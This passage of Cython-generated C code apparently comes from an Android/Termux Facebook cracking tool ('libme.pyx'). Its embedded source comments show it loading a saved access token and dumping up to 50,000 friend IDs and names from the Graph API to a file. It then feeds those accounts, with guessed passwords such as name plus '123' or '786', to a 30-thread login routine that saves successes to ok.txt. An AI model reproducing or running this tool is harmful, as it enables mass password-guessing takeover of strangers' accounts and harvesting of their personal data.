            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 912, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 912, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 912, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":911
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":890
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__100__00__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":926
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_59__ma___sal2__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_59__ma___sal2__ = {"__ma___sal2__", (PyCFunction)__pyx_pw_5libme_5James_59__ma___sal2__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_59__ma___sal2__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__ma___sal2__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_58__ma___sal2__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_58__ma___sal2__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v___total = NULL;
  PyObject *__pyx_v______ = NULL;
  PyObject *__pyx_v_zx = NULL;
  PyObject *__pyx_v___ids = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_ex = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v___id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__ma___sal2__", 0);

  /* "libme.pyx":927
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":928
 * 	def __ma___sal2__(self):
 * 		try:
 * 			token=open('login.txt', 'r').read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 928, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 928, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 928, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":927
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "libme.pyx":929
 * 		try:
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("  [!] Token invalid")
 * 		try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__ma___sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 929, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      /* "libme.pyx":930
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 930, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":927
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":931
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "libme.pyx":932
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__44, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 932, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 932, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v___total = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":931
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":933
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:             # <<<<<<<<<<<<<<
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f_2.txt")
 */
    /*except:*/ {
      __Pyx_AddTraceback("libme.James.__ma___sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 933, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":934
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 * 			__total = 1             # <<<<<<<<<<<<<<
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")
 */
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_XDECREF_SET(__pyx_v___total, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L12_exception_handled;
    }
    __pyx_L13_except_error:;

    /* "libme.pyx":931
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":935
 * 		except:
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f_2.txt")             # <<<<<<<<<<<<<<
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 935, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 935, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_s_rm_rf_sdcard_f_2_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_rm_rf_sdcard_f_2_txt);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 935, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":936
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")             # <<<<<<<<<<<<<<
 * 		for zx in range(__total):
 * 			zx += 1
 */
  __Pyx_INCREF(__pyx_kp_s_sdcard_f_2_txt);
  __pyx_v______ = __pyx_kp_s_sdcard_f_2_txt;

  /* "libme.pyx":937
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v___total); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 937, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
    __pyx_t_6 = __pyx_t_4; __Pyx_INCREF(__pyx_t_6); __pyx_t_9 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_9 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 937, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_10 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 937, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_6))) {
        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 937, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 937, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 937, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 937, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_10(__pyx_t_6);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 937, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":938
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):
 * 			zx += 1             # <<<<<<<<<<<<<<
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 */
    __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_zx, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 938, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":939
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 939, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_XDECREF_SET(__pyx_v___ids, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":940
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        /* "libme.pyx":941
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))             # <<<<<<<<<<<<<<
 * 				ex=json.loads(rex.text)
 * 				file = open(_____ , 'a')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 941, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 941, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 941, __pyx_L21_error) }
        __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 941, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_v___ids);
        __Pyx_GIVEREF(__pyx_v___ids);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v___ids);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_token);
        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_t_5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 941, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 941, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":942
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)             # <<<<<<<<<<<<<<
 * 				file = open(_____ , 'a')
 * 				id = []
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 942, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_loads); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 942, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_text); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 942, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 942, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":943
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 * 				file = open(_____ , 'a')             # <<<<<<<<<<<<<<
 * 				id = []
 * 				for a in ex['friends']['data']:
 */
        __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 943, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v______);
        __Pyx_GIVEREF(__pyx_v______);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v______);
        __Pyx_INCREF(__pyx_n_s_a);
        __Pyx_GIVEREF(__pyx_n_s_a);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 943, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_file, __pyx_t_11);
        __pyx_t_11 = 0;

        /* "libme.pyx":944
 * 				ex=json.loads(rex.text)
 * 				file = open(_____ , 'a')
 * 				id = []             # <<<<<<<<<<<<<<
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])
 */
        __pyx_t_11 = PyList_New(0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 944, __pyx_L21_error)
